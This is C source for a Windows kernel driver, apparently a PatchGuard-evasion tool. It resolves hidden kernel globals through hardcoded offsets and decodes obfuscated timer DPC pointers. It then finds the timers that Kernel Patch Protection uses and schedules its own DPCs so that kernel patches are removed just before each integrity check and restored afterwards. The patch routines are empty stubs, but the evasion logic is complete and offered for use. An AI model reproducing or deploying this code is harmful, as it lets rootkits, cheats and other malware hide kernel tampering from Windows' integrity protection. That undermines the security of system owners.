#include <ntddk.h>
#include <wdf.h>

//Offsets need updating
UINT32 Offset_TimerTable = 0x3940;
UINT32 Offset_NextExecutionTime = 0x144;
UINT64 Offset_KiWaitAlways = 0xCFC808;
UINT64 Offset_KiWaitNever = 0xCFCA10;
UINT64 Offset_HalpClockTimer = 0xC00A40;
UINT64 Offset_KeBugCheckEx = 0x3FBCA0;
UINT64 Offset_PrcbIndex = 0xCFDCC0;
UINT64 Offset_CcBcbProfiler = 0xCFC668;

typedef BYTE* PBYTE;
typedef PVOID PKPRCB;

PINT64 Global_KiWaitAlways = NULL;
PINT64 Global_KiWaitNever = NULL;
PVOID* Global_HalpClockTimer = NULL;
PKPRCB Global_PrcbIndex = NULL;
PVOID Global_CcBcbProfiler = NULL;

#define MS_TO_HNS(x) (x * 10000)
#define STOP_INITIAL_COOLOWN 1000
#define STOP_COOLOWN 500
#define EVASION_TIMER_UNDERSHOOT 500
#define AVOIDING_TIMER ((PVOID)0x1)
#define AVOIDING_DPC ((PVOID)0x0)
#define MAX_PG_TIMERS 10
#define TIMER_EXPIRY_SIZE 64
#define TIMER_ENTRIES_SIZE 256

#define GET_GLOBAL(Type, Offset, ImageBase) ((Type)((ImageBase) + (Offset)))

typedef enum _TIMER_SEARCH_STATUS
{
    StopTimerSearch,
    ContinueTimerSearch,
} TIMER_SEARCH_STATUS, * PTIMER_SEARCH_STATUS;

typedef TIMER_SEARCH_STATUS TIMER_CALLBACK(PKTIMER Timer, PKDPC DecodedDpc);
typedef TIMER_CALLBACK* PTIMER_CALLBACK;

typedef struct _KTIMER_TABLE_ENTRY
{
    unsigned __int64 Lock;
    LIST_ENTRY Entry;
    ULARGE_INTEGER Time;
} KTIMER_TABLE_ENTRY, * PKTIMER_TABLE_ENTRY;

typedef struct _KTIMER_TABLE
{
    PKTIMER TimerExpiry[TIMER_EXPIRY_SIZE];
    KTIMER_TABLE_ENTRY TimerEntries[2][TIMER_ENTRIES_SIZE];
} KTIMER_TABLE, * PKTIMER_TABLE;

typedef struct _EVADE_CONTEXT
{
    PKTIMER Timers[MAX_PG_TIMERS];
    UINT32 TimerCount;
    ULONGLONG LastAvoidedExpiration;
    KDPC StartEvasionDpc;
    KTIMER StartEvasionTimer;
    KDPC StopEvasionDpc;
    KTIMER StopEvasionTimer;
} EVADE_CONTEXT, PEVADE_CONTEXT;

VOID EnableAllPatches()
{
    //Enable Patches Here.
}

VOID DisableAllPatches()
{
    //Disable Patches Here.
}

EVADE_CONTEXT g_EvadeContext = { 0 };

VOID InsertTimerToContext(PKTIMER Timer)
{
    if (g_EvadeContext.TimerCount >= MAX_PG_TIMERS)
    {
        g_EvadeContext.TimerCount++;
        return;
    }
    g_EvadeContext.Timers[g_EvadeContext.TimerCount++] = Timer;
}

FORCEINLINE BOOLEAN TimerOverflow()
{
    return g_EvadeContext.TimerCount > MAX_PG_TIMERS;
}

BOOLEAN IsTargetAwareTimer(PKTIMER Timer, PKDPC DecodedDpc)
{
    UNREFERENCED_PARAMETER(Timer);
    if (!MmIsAddressValid(DecodedDpc))
    {
        return FALSE;
    }
    INT64 SpecialBit = (INT64)DecodedDpc->DeferredContext >> 47;
    return SpecialBit != 0 && SpecialBit != -1;
}

BOOLEAN IsTargetUnawareTimer(PKTIMER Timer, PKDPC DecodedDpc)
{
    UNREFERENCED_PARAMETER(Timer);
    if (!MmIsAddressValid(DecodedDpc))
    {
        return FALSE;
    }
    return DecodedDpc->DeferredRoutine == Global_CcBcbProfiler;
}

TIMER_SEARCH_STATUS FindTimer(PKTIMER Timer, PKDPC DecodedDpc)
{
    if (IsTargetAwareTimer(Timer, DecodedDpc))
    {
        InsertTimerToContext(Timer);
    }
    if (IsTargetUnawareTimer(Timer, DecodedDpc))
    {
        InsertTimerToContext(Timer);
    }
    return ContinueTimerSearch;
}

PKTIMER_TABLE GetTimerTable(PKPRCB Prcb)
{
    return (PKTIMER_TABLE)((PCHAR)Prcb + Offset_TimerTable);
}

VOID AcquireSpinLock64(volatile unsigned __int64* Lock)
{
    while (_interlockedbittestandset64((volatile __int64*)Lock, 0))
    {
        YieldProcessor();
    }
}

VOID ReleaseSpinLock64(volatile unsigned __int64* Lock)
{
    _InterlockedAnd64((volatile __int64*)Lock, 0ULL);
}

TIMER_SEARCH_STATUS SearchTimerList(PKTIMER_TABLE_ENTRY TimerTableEntry, PTIMER_CALLBACK TimerCallback)
{
    AcquireSpinLock64(&TimerTableEntry->Lock);
    PLIST_ENTRY pListEntry = TimerTableEntry->Entry.Flink;
    while (pListEntry && pListEntry != &TimerTableEntry->Entry)
    {
        PKTIMER pTimer = CONTAINING_RECORD(pListEntry, KTIMER, TimerListEntry);
        PKDPC pDpc = (PKDPC)(*Global_KiWaitAlways ^ _byteswap_uint64((UINT64)pTimer ^ _rotl64((INT64)pTimer->Dpc ^ *Global_KiWaitNever, (UCHAR)*Global_KiWaitAlways))); //May change across windows versions
        if (TimerCallback(pTimer, pDpc) == StopTimerSearch)
        {
            ReleaseSpinLock64(&TimerTableEntry->Lock);
            return StopTimerSearch;
        }
        pListEntry = pListEntry->Flink;
    }
    ReleaseSpinLock64(&TimerTableEntry->Lock);
    return ContinueTimerSearch;
}

VOID SearchTimerTable(PKTIMER_TABLE TimerTable, PTIMER_CALLBACK TimerCallback)
{
    PKTIMER_TABLE_ENTRY pKernelEntries = TimerTable->TimerEntries[KernelMode];
    PKTIMER_TABLE_ENTRY pUserEntries = TimerTable->TimerEntries[UserMode];
    for (USHORT i = 0; i < TIMER_ENTRIES_SIZE; i++)
    {
        if (SearchTimerList(&pKernelEntries[i], TimerCallback) == StopTimerSearch)
        {
            break;
        }
        if (SearchTimerList(&pUserEntries[i], TimerCallback) == StopTimerSearch)
        {
            break;
        }
    }
}

PKPRCB GetPrcb(ULONG ProcessorNumber)
{
    return ((PKPRCB*)((PUCHAR)Global_PrcbIndex))[ProcessorNumber];
}

BOOLEAN SearchSystemTimers(PTIMER_CALLBACK TimerCallback)
{
    PKPRCB pPrcb = GetPrcb(0);
    if (!pPrcb)
    {
        return FALSE;
    }
    SearchTimerTable(GetTimerTable(pPrcb), TimerCallback);
    return TRUE;
}

BOOLEAN UpdateTimers()
{
    g_EvadeContext.TimerCount = 0;
    SearchSystemTimers(&FindTimer);
    if (TimerOverflow())
    {
        return FALSE;
    }
    return TRUE;
}

ULONGLONG EarliestTimerExpiration()
{
    ULONGLONG earliestTime = MAXLONGLONG;
    for (UINT32 i = 0; i < g_EvadeContext.TimerCount; i++)
    {
        PKTIMER currentTimer = g_EvadeContext.Timers[i];
        if (!currentTimer)
        {
            continue;
        }
        ULONGLONG currentTime = currentTimer->DueTime.QuadPart;
        if (currentTimer->Period)
        {
            DbgBreakPoint();
        }
        if (currentTime < earliestTime)
        {
            earliestTime = currentTime;
        }
    }
    return earliestTime;
}

BOOLEAN SetStopEvasionTimer()
{
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = MS_TO_HNS(STOP_INITIAL_COOLOWN);
    g_EvadeContext.StopEvasionDpc.SystemArgument1 = g_EvadeContext.StartEvasionDpc.SystemArgument1;
    g_EvadeContext.StartEvasionDpc.SystemArgument2 = 0;
    if (KeSetTimerEx(&g_EvadeContext.StopEvasionTimer, dueTime, STOP_COOLOWN, &g_EvadeContext.StopEvasionDpc))
    {
        return FALSE;
    }
    return TRUE;
}

VOID StartEvasion(PKDPC Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    DisableAllPatches();
    SetStopEvasionTimer();
}

ULONG NextExecutionTime()
{
    return *(PULONG)((PBYTE)*Global_HalpClockTimer + Offset_NextExecutionTime);
}

BOOLEAN SetStartEvasionTimer(BOOLEAN RequiresUpdate)
{
    if (RequiresUpdate && !UpdateTimers())
    {
        return FALSE;
    }
    ULONGLONG timerExpiration = EarliestTimerExpiration();
    ULONG dpcExecution = NextExecutionTime();
    if (timerExpiration < dpcExecution)
    {
        g_EvadeContext.LastAvoidedExpiration = timerExpiration;
        g_EvadeContext.StartEvasionDpc.SystemArgument1 = AVOIDING_TIMER;
    }
    else
    {
        g_EvadeContext.LastAvoidedExpiration = dpcExecution;
        g_EvadeContext.StartEvasionDpc.SystemArgument1 = AVOIDING_DPC;
    }
    LARGE_INTEGER startEvasionTime;
    startEvasionTime.QuadPart = g_EvadeContext.LastAvoidedExpiration - EVASION_TIMER_UNDERSHOOT;
    if (KeSetTimer(&g_EvadeContext.StartEvasionTimer, startEvasionTime, &g_EvadeContext.StartEvasionDpc))
    {
        return FALSE;
    }
    return TRUE;
}

VOID StopEvasion()
{
    EnableAllPatches();
    SetStartEvasionTimer(FALSE);
}

VOID TryStopEvasion(PKDPC Dpc, PVOID DeferredContext, PVOID IsAvoidingTimer, PVOID pvAttemptCount)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UINT64 attemptCount = (UINT64)pvAttemptCount;
    if (attemptCount >= 5)
    {
        goto Exit;
    }
    g_EvadeContext.StopEvasionDpc.SystemArgument2 = (PVOID)(attemptCount + 1);
    UINT32 prevTimerCount = g_EvadeContext.TimerCount;
    if (!UpdateTimers())
    {
        return;
    }
    if (IsAvoidingTimer == AVOIDING_TIMER && g_EvadeContext.LastAvoidedExpiration == EarliestTimerExpiration())
    {
        return;
    }
    if (prevTimerCount == g_EvadeContext.TimerCount)
    {
        StopEvasion();
    Exit:
        KeCancelTimer(&g_EvadeContext.StopEvasionTimer);
    }
}

BOOLEAN PrepareContext()
{
    KeInitializeDpc(&g_EvadeContext.StartEvasionDpc, StartEvasion, NULL);
    KeInitializeTimerEx(&g_EvadeContext.StartEvasionTimer, NotificationTimer);
    KeInitializeDpc(&g_EvadeContext.StopEvasionDpc, TryStopEvasion, NULL);
    KeInitializeTimerEx(&g_EvadeContext.StopEvasionTimer, NotificationTimer);
    return TRUE;
}

BOOLEAN KPPB_Evade()
{
    if (!PrepareContext())
    {
        return FALSE;
    }
    if (!SetStartEvasionTimer(TRUE))
    {
        return FALSE;
    }
    return TRUE;
}

VOID KPPB_Unload()
{
    KeCancelTimer(&g_EvadeContext.StartEvasionTimer);
    KeCancelTimer(&g_EvadeContext.StopEvasionTimer);
}

BOOLEAN InitializeGlobals()
{
    UINT64 ImageBase = (UINT64)&KeBugCheckEx - Offset_KeBugCheckEx;
    Global_KiWaitAlways = GET_GLOBAL(PINT64, Offset_KiWaitAlways, ImageBase);
    Global_KiWaitNever = GET_GLOBAL(PINT64, Offset_KiWaitNever, ImageBase);
    Global_HalpClockTimer = GET_GLOBAL(PVOID*, Offset_HalpClockTimer, ImageBase);
    Global_PrcbIndex = GET_GLOBAL(PKPRCB, Offset_PrcbIndex, ImageBase);
    Global_CcBcbProfiler = GET_GLOBAL(PVOID, Offset_CcBcbProfiler, ImageBase);
    return TRUE;
}

void NTAPI DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    KPPB_Unload();
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    if (InitializeGlobals() == TRUE)
    {
        if (KPPB_Evade() == TRUE)
        {
            DriverObject->DriverUnload = DriverUnload;
            return STATUS_SUCCESS;
        }
        else
        {
            return STATUS_FAILED_DRIVER_ENTRY;
        }
    }
    else
    {
        return STATUS_FAILED_DRIVER_ENTRY;
    }
}